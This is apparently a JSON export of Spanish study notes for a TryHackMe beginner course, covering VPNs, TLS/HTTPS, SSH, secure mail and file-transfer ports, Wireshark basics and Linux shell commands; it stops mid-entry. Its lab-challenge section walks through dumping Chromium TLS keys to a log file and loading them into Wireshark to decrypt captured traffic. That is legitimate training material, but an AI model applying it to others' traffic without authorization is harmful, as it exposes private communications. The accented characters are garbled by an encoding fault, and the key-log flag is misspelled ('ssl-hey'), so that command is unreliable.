    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "Considera una compa√±√≠a con oficinas en diferentes localizaciones. Estas deben poder conectarse a la rama principal con dispositivos diferentes. La soluci√≥n m√°s econ√≥mica es crear una VPN (Virtual Private Network).\n\nCuando se dise√±√≥ Internet, TCP se centraba en repartir paquetes. Si un paquete no era recibido (ACK), TCP ten√≠a incorporados mecanismos para detectarlo y reenviarlo. Pero no ten√≠a mecanismos para asegurarse de que toda la informaci√≥n saliente era protegida y permanec√≠a inalterable. La VPN fue la soluci√≥n.\n\nTodas las compa√±√≠as requieren de intercambio privado de informaci√≥n. Los requisitos indispensables son conexi√≥n a Internet, un servidor VPN y un cliente.\n\nEl diagrama de red de abajo muestra c√≥mo una compa√±√≠a con dos ramas remotas se conectan a la rama principal. Un cliente VPN se conectar√° al servidor VPN en la rama principal. En este caso, el cliente VPN encriptar√° el tr√°fico y lo pasar√° a esta por el t√∫nel VPN (azul). El tr√°fico VPN se limita a las lineas azules, las verdes llevan el tr√°fico desencriptado.\n\n![[093 1.png]]\n\nEn el diagrama de abajo vemos c√≥mo dos clientes se conectan a la rama principal usando la VPN:\n\n![[094 1.png]]\n\nUna vez que el t√∫nel VPN est√° establecido, todo el tr√°fico de Internet ser√° routeado a la conexi√≥n VPN. De esta manera, cuando intentamos acceder a un servicio de Internet, no veremos nuestra IP sino la del servidor VPN. Esto se puede utilizar para bypassear ciertas restricciones geogr√°ficas, pues si un usuario en Espa√±a se conecta a una VPN japonesa, para los servidores receptores de sus peticiones web aparecer√° como que est√° en Jap√≥n.\n\nDe todas formas, la VPN no siempre routea el tr√°fico, pues puede estar configurada para no hacerlo. Algunos pa√≠ses consideran usar una VPN ilegal y castigable. Comprueba las regulaciones locales antes de hacer nada.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. HTTPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/3-https/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/3. HTTPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "<h2>HTTP</h2>\nComo hemos estudiado en la lecci√≥n [[0. Networking Core Protocols]], HTTP necesita TCP y usa el puerto 80 por defecto. Tambi√©n vimos que todo el tr√°fico HTTP se manda en texto claro y cualquiera puede interceptarlo. \n\nRepasemos los pasos m√°s comunes antes de que un buscador le pida a una p√°gina la informaci√≥n por HTTP:\n\n1. Establecer un three-way handshake TCP con el servidor de destino.\n2. Comunicarse usando el protocolo HTTP por ejemplo, `GET / HTTP/1.1`.\n\nEstos pasos se muestran en la imagen de abajo. Los tres paquetes del handshake TCP (marcados con un 1) preceden al primer paquete HTTP con `GET`. La comunicaci√≥n est√° marcada con un 2. Los √∫ltimos 3 mensajes son la terminaci√≥n de la comunicaci√≥n y est√°n marcados con un 3.\n\n![[87.png]]\n\n--------------------------\n<h2>HTTP sobre TLS</h2>\nHTTPS es Hypertext Transfer Protocol Secure. Es b√°sicamente HTTP sobre TLS. Por ello, pedir a una p√°gina el HTTPS requerir√° los siguientes pasos (despu√©s de resolver el nombre de dominio):\n\n1. Establecer un three-way handshake TCP con el servidor.\n2. Establecer una conexi√≥n TLS.\n3. Comunicarse usando el protocolo HTTP.\n\nLa foto de debajo muestra una conexi√≥n TCP establecida en los tres primeros paquetes, marcados con un 1. Despu√©s, varios paquetes son intercambiados para negociar el protocolo TLS, marcado con un 2. Los apartados 1 y 2 son donde las negociaciones y establecimiento TLS ocurren. Finalmente, la informaci√≥n de la aplicaci√≥n HTTP se intercambia, marcado con un 3. Mirando Wireshark vemos que pone \"Application Data\" porque no hay manera de saber su es de hecho HTTP o alg√∫n otro protocolo mandado por el puerto 443.\n\n![[088.png]]\n\nSi intentamos ver lo que contienen los contenidos de los paquetes vemos algo del siguiente estilo sin tener la clave de encriptaci√≥n:\n\n![[089.png]]\n\n------------------------\n<h2>Consiguiendo la Llave de Encriptaci√≥n</h2>\nEs improbable que consigamos la clave, pero si lo hacemos, se la podemos dar a Wireshark para poder ver los paquetes de forma normal. Aqu√≠ un ejemplo de c√≥mo se ven las comunicaciones encriptadas de arriba una vez tenemos la llave:\n\n![[090.png]]\n\n![[091.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. SSH",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/5-ssh/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/5. SSH.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "Hemos usado el protocolo telnet en la primera lecci√≥n de esta unidad. Aunque es conveniente para loguearse y administrar sistemas, es arriesgado cuando todo el tr√°fico se manda en texto claro. En 1995, Tatu Yl√∂nen desarroll√≥ Secure Shell (SSH) y lo lanz√≥ de manera abierta. Una versi√≥n m√°s segura fue lanzada en 1996 (SSH-2). Hoy en d√≠a, al usar SSH, lo m√°s probable es que est√©s usando OpenSSH, una implementaci√≥n de c√≥digo abierto de SSH hecha por los desarrolladores de OpenBSD. \n\nOpenSSH ofrece algunos beneficios. Veamos los puntos clave:\n\n- **Autentificaci√≥n segura:** A parte de la autentificaci√≥n basada en contrase√±a, soporta public key y autentificaci√≥n en dos factores.\n- **Confidencialidad:** Otorga encriptaci√≥n end-to-end, protegiendo ante espionaje. Adem√°s te notifica de nuevas claves de servidor para proteger contra ataque MITM (Man In The Middle).\n- **Integridad:** Adem√°s de proteger la confidencialidad, protege y asegura la integridad de la informaci√≥n (no modificaciones).\n- **Tunneling:** SSH puede crear un \"t√∫nel\" seguro para routear otros protocolos a trav√©s de SSH. Esto conlleva un set-up parecido a la VPN.\n- **Redireccionamiento X11:** Permite usar interfaz gr√°fica a trav√©s de la red si te conectas a un sistema UNIX.\n\nUsar√≠amos el comando `ssh <username>@<hostname>` para conectarnos al servidor SSH. Si el nombre de usuario es el mismo que tu nombre actual, s√≥lo necesitas `ssh hostname`. Entonces, se te pedir√° la contrase√±a. De todas formas, si la autentificaci√≥n de llave p√∫blica es usada, ser√°s logueado autom√°ticamente.\n\nLa imagen de abajo muestra un ejemplo ejecutando Wireshark en un sistema Kali Linux remoto. El argumento `-X` sirve para permitir interfaces gr√°ficas, por ejemplo: `ssh 192.168.124.148 -X`. El sistema local necesita tener un sistema gr√°fico v√°lido para que funcione.\n\n![[092.png]]\n\nMientras que telnet escucha en el puerto 23, SSH lo hace en el 22.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. SMPTS, POP3S and IMAPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/4-smpts-pop3s-and-imaps/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/4. SMPTS, POP3S and IMAPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "A√±adir TLS a SMTP, POP3 e IMAP no es diferente de a√±ad√≠rselo a HTTP. Casi todos los puntos que hemos visto para HTTPS aplican para SMTPS, POP3S e IMAPS.\n\nAqu√≠ una tabla con protocolos y puertos:\n\n| Protocolo | Puerto por defecto |\n| --------- | ------------------ |\n| HTTP      | 80                 |\n| SMTP      | 25                 |\n| POP3      | 110                |\n| IMAP      | 143                |\n\n| Protocolo | Puerto por defecto |\n| --------- | ------------------ |\n| HTTPS     | 443                |\n| SMTPS     | 465 and 587        |\n| POP3S     | 995                |\n| IMAPS     | 993                |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. SFTP and FTPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/6-sftp-and-ftps/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/6. SFTP and FTPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "SFTP significa SSH File Transfer Protocol y permite la transferencia de archivos de manera segura. Es parte de la suite del protocolo SSH y comparte el mismo puerto, 22. Si est√° configurado de tal manera puedes conectarte con el comando `sftp <username>@<hostname>`. Una vez logueado, puedes usar comandos como `get <filename>` y `put <filename>` para descargar y subir archivos.\n\nSFTP no debe ser confundido con FTPS (File Transfer Protocol Secure).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. TLS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/2-tls/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/2. TLS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "En un momento del pasado s√≥lo necesitabas una herramienta de lectura de paquetes para leer chats, emails y credenciales. Era habitual que los atacantes pusieran sus tarjetas de red en modo promiscuo y revisaran despu√©s el log para encontrar credenciales. No hab√≠a nada que pudieras hacer como usuario para protegerte.\n\nA principios de los 90, Netscape Communications reconoci√≥ la necesidad de la comunicaci√≥n securizada. Desarrollaron SSL (Secure Sockets Layer) y lanzaron SSL 2.0 en 1995. En 1999, IETF (Internet Engineering Task Force desarroll√≥ TLS). Aunque era similar, TLS 1.0 era un avance respecto a SSL 3.0.\n\nComo SSL, su predecesor, TLS es un protocolo criptogr√°fico que opera en la capa de transporte del modelo OSI. Permite comunicaciones seguras entre servidor y cliente. Hoy en d√≠a la mayor√≠a de protocolos han recibido mejoras de seguridad con la adici√≥n de TLS.\n\n-----------------------\n<h2>Bagaje t√©cnico</h2>\nEl primer paso para cualquier servidor o cliente es identificarse para obtener un certificado TLS firmado. Generalmente, el administrador del servidor crea un CSR (Certificate Signing Request) y lo sube a la CA (Certificate Authority). Esta verifica el CSR y comanda un certificado digital. Una vez el certificado firmado es recibido, puede ser usado para identificar el servidor o el cliente al resto.\n\nPor norma general, tener un certificado implica pagar una tasa anual, pero [Let's Encrypt](https://letsencrypt.org/) te permite tener tu certificado de forma gratuita.\n\nUn Self-Signed Certificate es otro tipo de certificado que puedes hacer pero no autentifica nada ante terceros partidos, por no ser una firma reconocida.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Closing notes + Challenge",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/8-closing-notes-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/8. Closing notes + Challenge.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "En esta lecci√≥n hemos cubierto el uso de TLS, el cual provee de una capa de seguridad a protocolos como HTTP, SMTP, POP3 e IMAP. Adem√°s hemos visto lo que es SSH y c√≥mo usarlo a nivel b√°sico y las VPNs de manera superficial.\n\n------------------\n<h2>Challenge</h2>\nAl ejecutar `chromium --ssl-hey-log-file=~/ssl-key.log` dumpeamos las claves TLS al archivo `ssl-key.log`. El archivo de captura que analizaremos es `randy-chromium.pcapng` en la carpeta `Documents`. Al abrir `Wireshark` podemos configurarlo para usar `ssl-key.log`.\n\nPara hacerlo seguimos los pasos:\n\n1. Elegimos `Protocol Preferences`.\n2. Seleccionamos `Transport Layer Security`.\n3. Clickamos en `Open Transport Layer Security preferences`.\n4. Le damos a `Browse` y buscamos el documento que contiene las claves TLS.\n\nUna vez all√≠ podemos filtrar con `http2.headers.method == \"POST\"`. Esto nos lleva al paquete 365. Si seguimos el flujo caemos en el paquete 366, de tipo xml-urlencoded-form. Si desencriptamos el paquete encontramos la flag.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Packet Filtering",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/5-packet-filtering/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/5. Packet Filtering.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Filtrado de Paquetes</h2>\nWireshark tiene un motor de filtrado poderoso que ayuda a estrechar el tr√°fico. Tiene dos tipos de filtrado: captura y muestra (capture y display).\n\n- Los filtros de captura se utilizan para capturar paquetes v√°lidos para el filtro.\n- Los filtros de muestra se usan para ver aquellos paquetes que cumplen con el requisito.\n\nLos filtros son queries espec√≠ficas dise√±adas para los protocolos disponibles en Wireshark. Aunque los filtros son la √∫nica opci√≥n para estrechar los resultados, hay dos maneras de introducirlos: mediante \"comandos\" o queries en la barra de filtrado o mediante el click derecho en los men√∫s.\n\n>[!TIP] Si puedes hacer click en √©l, puedes filtrarlo y copiarlo.\n\n---------------------\n<h2>Apply as Filter</h2>\nEs la forma m√°s b√°sica de filtrar tr√°fico. Al investigar una captura, puedes hacer click en el campo que quieres filtrar y usar el men√∫ de click derecho o `Analyze -> Apply as Filter`. Una vez aplicado el filtro, Wireshark generar√° la query necesaria y la aplicar√°.\n\n![[115.png]]\n\n--------------------\n<h2>Conversation Filter</h2>\nAl usar la opci√≥n de `Apply as Filter`, investigas sobre un paquete en concreto. Sin embargo, si quieres investigar sobre la conversaci√≥n que ha tenido lugar centr√°ndote en las direcciones IP, este tipo de filtro es muy √∫til porque permite ver s√≥lo los paquetes relacionados. Puedes acceder usando el men√∫ de click derecho o `Analyze -> Conversation Filter`.\n\n![[116.png]]\n\n--------------------------\n<h2>Colourise Conversation</h2>\nEsta opci√≥n es similar a la de `Conversation Filter` solo que remarca los paquetes conectados sin aplicar un filtro de muestra. No tiene en cuenta el color del paquete antes de ser aplicado y puede ser accedido con el click derecho o `View -> Colourise Conversation`. Si queremos devolverlo a la normalidad hacemos `View -> Colourise Conversation -> Reset Colourisation`.\n\n![[117.png]]\n\n-------------------\n<h2>Prepare as Filter</h2>\nSimilar a `Apply as Filter`, esta opci√≥n crea una muestra usando el click derecho. Sin embargo, no aplica el filtro, sino que s√≥lo lo desarrolla en la barra de queries. Se puede poner otras queries usando `and` u `or`.\n\n![[118.png]]\n\n---------------------\n<h2>Apply as Column</h2>\nPor defecto, la lista de paquetes ofrece informaci√≥n b√°sica sobre cada paquete. Puedes usar el men√∫ de click derecho o `Analyze -> Apply as Column` para a√±adir columnas al panel de la lista de paquetes. Una vez hecho, ser√° visible en el panel de la lista. Puedes activarlas y desactivarlas haciendo click derecho en la parte superior del panel de paquetes.\n\n![[119.png]]\n\n------------------\n<h2>Follow Stream</h2>\nWireshark muestra todo en flujo de paquetes. Sin embargo, es posible reconstruir el flujo de uno o varios paquetes concretos.\n\nSeguir el flujo del protocolo ayuda a recrear la informaci√≥n a nivel de aplicaci√≥n y a entender el evento de inter√©s. Tambi√©n es posible ver informaci√≥n que est√© en texto claro como nombres de usuario, contrase√±as, etc.\n\nPuedes usar el click derecho o `Analyze -> Follow TCP/UDP/HTTP Stream`. Los flujos salen en una nueva pesta√±a, siendo en azul la respuesta del servidor y en rojo la petici√≥n del cliente.\n\n![[120.png]]\n\nUna vez seguido un flujo, Wireshark crea y aplica la query necesaria para seguir el flujo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "Wireshark es una herramienta de c√≥digo abierto y multiplataforma de an√°lisis de paquetes capaz de sniffear e investigar el tr√°fico en vivo y de inspeccionar la captura de paquetes (PCAP). En esta unidad veremos sus usos y como analizar paquetes con ella.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Whireshark - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/0-whireshark-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/0. Whireshark - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/1. Introduction]]\n- [[2. Tool Overview]]\n- [[3. Packet Dissection]]\n- [[4. Packet Navigation]]\n- [[5. Packet Filtering]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Packet Navigation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/4-packet-navigation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/4. Packet Navigation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>N√∫meros de Paquetes</h2>\nWireshark calcula el n√∫mero de paquetes investigados y asigna un n√∫mero √∫nico a cada paquete. Esto hace sencillo ir a un paquete concreto.\n\n--------------------\n<h2>Ir a un Paquete</h2>\nNo s√≥lo sirven los n√∫meros para conocer el total de estos, sino para hacer m√°s sencillo encontrar e investigar paquetes espec√≠ficos. Adem√°s contiene un sistema de seguimiento que te permite moverte entre los paquetes de una misma \"conversaci√≥n\". Para ello puedes pulsar en `Go` o escribir `frame.number == <n√∫mero>`.\n\n------------------\n<h2>Encontrar Paquetes</h2>\nA parte del n√∫mero de paquete, Wireshark puede encontrar paquetes por contenido. Para ello podemos usar `Edit -> Find Packet`. Esto facilita a los analistas encontrar un evento particular.\n\nHay dos puntos cruciales para encontrar paquetes:\n\n- El primero es saber el tipo de input (Display filter, Hex, String y RegEx). Las b√∫squedas son case insensitive pero se puede cambiar haciendo click en el bot√≥n de radio.\n- El segundo es elegir el campo de b√∫squeda. Puedes llevar a cabo b√∫squedas en la lista de paquetes, los detalles del paquete y los bytes de paquetes y es de crucial importancia. \n  \n  ![[107.png]]\n\n-------------------\n<h2>Marcar Paquetes</h2>\nEs otra funcionalidad √∫til para los analistas. Podemos encontrar/apuntar a un paquete espec√≠fico marc√°ndolo. Se puede desmarcar edit√°ndolo. Los paquetes marcados aparecen en negro.\n\n![[108.png]]\n\n-------------------\n<h2>Comentarios de Paquetes</h2>\nPodemos a√±adir comentarios a los paquetes que consideremos para ayudar a la investigaci√≥n posterior o recordar algo. Al contrario que el marcado de paquetes, los comentarios pueden pueden permanecer en la captura hasta que alguien los elimina.\n\n![[109.png]]\n\n------------------\n<h2>Exportar Paquetes</h2>\nA veces es necesario separar ciertos paquetes para su an√°lisis del resto de la captura, que puede ser inmensamente grande. Esta funcionalidad permite la selecci√≥n de ciertos paquetes sospechosos (decided scope). Para ello podemos usar el men√∫ `File -> Export Specified Packets`.\n\n![[110.png]]\n\n-----------------\n<h2>Exportar objetos (archivos)</h2>\nWireshark puede extraer archivos transferidos a trabes de la red. Para un analista de seguridad es clave descubrir qu√© archivos son compartidos y guardarlos para una posterior investigaci√≥n. Los tipos de archivos que pueden extraerse son DICOM, HTTP, IMF, SMB y TFTP. Para acceder: `File -> Export Objects`.\n\n![[111.png]]\n\n-----------------\n<h2>Formato de muestra de Tiempo</h2>\nWireshark lista los paquetes a la vez que son capturados, lo que no siempre es √≥ptimo como visualizaci√≥n para la investigaci√≥n. Por defecto, Wireshark muestra el tiempo en \"Segundos desde el inicio de la Captura\". El uso com√∫n es usar el formato UTC Time Display. Para hacerlo: `View -> Time Display Format`.\n\n![[112.png]]\n\n![[113.png]]\n\n-----------------\n<h2>Informaci√≥n para Expertos</h2>\nWireshark tambi√©n detecta estados espec√≠ficos de protocolos para ayudarte a detectar y analizar posibles anomal√≠as y problemas. H√°gase notar que esto son s√≥lo sugerencias.\n\n| **Severity** | **Colour**   | **Info**                                                                  |\n| ------------ | ------------ | ------------------------------------------------------------------------- |\n| **Chat**     | **Azul**     | Informaci√≥n de flujo normal.                                              |\n| **Note**     | **Cian**     | Eventos notables como errores de c√≥digo de aplicaci√≥n.                    |\n| **Warn**     | **Amarillo** | Advertencias como errores de c√≥digo inusuales o problemas de declaraci√≥n. |\n| **Error**    | **Rojo**     | Problemas como paquetes mal formados.                                     |\nAlgunos de los grupos de informaci√≥n son:\n\n| **Grupo**      | **Info**                          |\n| -------------- | --------------------------------- |\n| **Checksum**   | Errores de checksum.              |\n| **Comment**    | Detecci√≥n de paquete comentado.   |\n| **Deprecated** | Uso de protocolo deprecado.       |\n| **Malformed**  | Detecci√≥n de paquete mal formado. |\nPara verlo podemos hacer uso del bot√≥n en la esquina inferior izquierda o `Analyze -> Expert Information`.\n\n![[114.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Tool Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/2-tool-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/2. Tool Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Casos de Uso</h2>\nWireshark es una de las herramientas de an√°lisis de tr√°fico m√°s potentes disponibles. Tiene varios prop√≥sitos:\n\n- Detectar y arreglar problemas de red.\n- Detectar anomal√≠as de seguridad.\n- Investigar y aprender detalles de protocolos.\n\n>[!NOTE] Wireshark no es un IDS (Intrusion Detection System). S√≥lo permite a los analistas descubrir e investigar los paquetes a fondo.\n\n-----------\n<h2>GUI y Data</h2>\nLa GUI de Wireshark se abre con una sola p√°gina todo en uno. A primera vista destacan 5 secciones:\n\n| Secci√≥n                           | Descripci√≥n                                                                                             |\n| --------------------------------- | ------------------------------------------------------------------------------------------------------- |\n| **Toolbar**                       | Contiene m√∫ltiples men√∫s y atajos para sniffeo de paquetes.                                             |\n| **Display Filter Bar**            | La barra principal y secci√≥n de filtrado.                                                               |\n| **Recent Files**                  | Lista de archivos recientes.                                                                            |\n| **Capture Filter and Interfaces** | Captura filtros y puntos de sniffeo (escucha). Estos puntos son las interfaces de red (eth0, lo, etc.). |\n| **Status Bar**                    | Estado de herramientas e informaci√≥n de paquetes y perfiles.                                            |\nLa imagen de abajo muestra la interfaz de Wireshark:\n\n![[093 1.png]]\n\n-----------\n<h2>Cargando Archivos PCAP</h2>\nPara abrir un archivo PCAP puedes d√°rselo como par√°metro a `wireshark <archivo_pcap>`, arrastrarlo a la interfaz o seleccionar `File`. Una vez abierto se ve algo as√≠:\n\n![[094 1.png]]\n\nAqu√≠ vemos varias secciones:\n\n| Secci√≥n             | Descripci√≥n                                                         |\n| ------------------- | ------------------------------------------------------------------- |\n| Packet List Pane    | Resumen de cada paquete (fuente, destino, protocolo e informaci√≥n). |\n| Packet Details Pane | Detalle del protocolo del paquete seleccionado.                     |\n| Packet Bytes Pane   | Representaci√≥n hex y ASCII decodeado  del paquete seleccionado.     |\n\n-------------\n<h2>Coloreando Paquetes</h2>\nA parte de la informaci√≥n r√°pida, Wireshark tambi√©n colorea los paquetes de acuerdo a diferentes condiciones y el protocolo para detectar anomal√≠as. Puedes crear tus propias reglas de colores para localizar eventos de inter√©s.\n\nWireshark tiene dos tipos de m√©todos de coloreo de paquetes. Reglas temporales, s√≥lo disponibles durante una sesi√≥n y reglas permanentes, que son guardadas bajo las preferencias de archivos (perfil). Podemos usar `click derecho en men√∫` o `View -> Coloring Rules`. La opci√≥n `Colourise Packet List` activa y desactiva las reglas de coloraci√≥n. Las reglas temporales se pueden hacer `View -> Conversation Filter`. As√≠ es como se ven las reglas por defecto:\n\n![[095 1.png]]\n\n---------------\n<h2>Sniffeo de Tr√°fico</h2>\nPodemos usar el bot√≥n azul de la aleta de un tibur√≥n para comenzar el sniffeo de la red (capturar tr√°fico), el bot√≥n rojo lo parara y el verde lo reiniciar√°. La barra de estado tambi√©n mostrar√° la interfaz sniffeada y el n√∫mero de paquetes recolectados.\n\n![[096.png]]\n\n-------------------\n<h2>Fusionar Archivos PCAP</h2>\nWireshark puede combinar dos archivos pcap en uno solo. Para ello podemos hacer `File -> Merge`. Al escoger el segundo archivo, Wireshark mostrar√° el total de paquetes en el archivo seleccionado. Una vez le damos a `Open`, se fusionar√° con el archivo pcap existente y crear√° un archivo pcap nuevo. **Debemos guardar el archivo fusionado antes de poder trabajar sobre √©l.**\n\n![[097.png]]\n\n-----------------\n<h2>Ver Detalles de Archivo</h2>\nConocer los detalles del archivo es de ayuda. Especialmente cuando trabajamos con m√∫ltiples archivos pcap, a veces necesitamos comprobar el file hash, el tiempo de captura, los comentarios, estad√≠sticas, etc. Para ver los detalles: `Statistics -> Capture File Properties` o haciendo click en el icono pcap localizado en la esquina inferior derecha.\n\n![[098.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Packet Dissection",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-whireshark-the-basics/3-packet-dissection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Whireshark - The Basics/3. Packet Dissection.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 5. Whireshark - The Basics",
    "content": "<h2>Disecci√≥n de Paquetes</h2>\n\nTambi√©n conocido como disecci√≥n de protocolos, investiga los detalles de los paquetes descodificando los protocolos y campos disponibles. Wireshark soporta una gran lista de protocolos para la disecci√≥n y a parte puedes escribir tus propios scripts de disecci√≥n. En la [documentaci√≥n de Wireshark](https://github.com/boundary/wireshark/blob/master/doc/README.dissector) puedes encontrar m√°s informaci√≥n sobre esto.\n\n-----------------\n<h2>Detalles de Paquetes</h2>\n\nPuedes hacer click en un paquete para abrir los detalles (hacer doble click los abrir√° en una pesta√±a nueva). Los paquetes consisten de entre 5 y 7 capas en el modelo OSI. Cada vez que clickemos en una parte del paquete se subrayar√°n los bytes correspondiente.\n\n![[099.png]]\n\nPodemos ver siete capas distintas en detalle:\n\n1. **El marco (capa 1):** Muestra que tipo de paquete/marco que estamos mirando y los detalles espec√≠ficos de la capa f√≠sica de OSI.\n   \n   ![[100.png]]\n   \n2. **Fuente \\[MAC] (capa 2):** Muestra la direcci√≥n MAC de salida y destino\n   \n   ![[101.png]]\n   \n3. **Fuente \\[IP] (capa 3):** Muestra las direcciones IPv4 de destino y fuente.\n   \n   ![[102.png]]\n   \n4. **Protocolo (capa 4):** Muestra detalles del protocolo usado (TCP/UDP) y los puertos de origen y destino de la capa de transporte de OSI.\n   \n   ![[103.png]]\n   \n5. **Errores de Protocolo:** La continuaci√≥n de la fase 4 muestra segmentos espec√≠ficos de TCP que tuvieron que ser remontados.\n   \n   ![[104.png]]\n   \n6. **Protocolo de Aplicaci√≥n (capa 5):** Muestra detalles espec√≠ficos del protocolo usado como HTTP, FTP o SMB de la capa de aplicaci√≥n del modelo OSI.\n   \n   ![[105.png]]\n   \n7. **Informaci√≥n de Aplicaci√≥n:** Esta extensi√≥n de la quinta capa muestra la informaci√≥n espec√≠ficas de la aplicaci√≥n.\n   \n   ![[106.png]]\n\nAhora que sabemos de qu√© se compone un paquete general, es hora de mirar varios protocolos de aplicaci√≥n en detalle.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. How to interact With a Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/2-how-to-interact-with-a-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/2. How to interact With a Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "La mayor√≠a de distribuciones de Linux usan Bash (Bourne Again Shell).\n\nAl interactuar con la consola hay varios comandos que necesitamos conocer:\n\n- `pwd`: Print Working Directory, nos dice el directorio actual.\n- `cd`: Change Directory, nos permite cambiar de directorio.\n- `ls`: List, nos devuelve los archivos y directorios (no ocultos) del directorio actual o el especificado.\n- `cat`: Concatenate, encadena car√°cter a car√°cter los contenidos de un archivo y los devuelve por la salida est√°ndar.\n- `grep`: Es una herramienta de filtrado de texto basado en patrones (soporta regex).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Shells",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/0-linux-shells/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/0. Linux Shells.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "[[1. Introduction to Linux Shells]]\n[[2. How to interact With a Shell]]\n[[3. Types of Linux Shells]]\n[[4. Shell Scripting and Components]]\n[[5. The Locker Script]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Types of Linux Shells",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/3-types-of-linux-shells/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/3. Types of Linux Shells.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
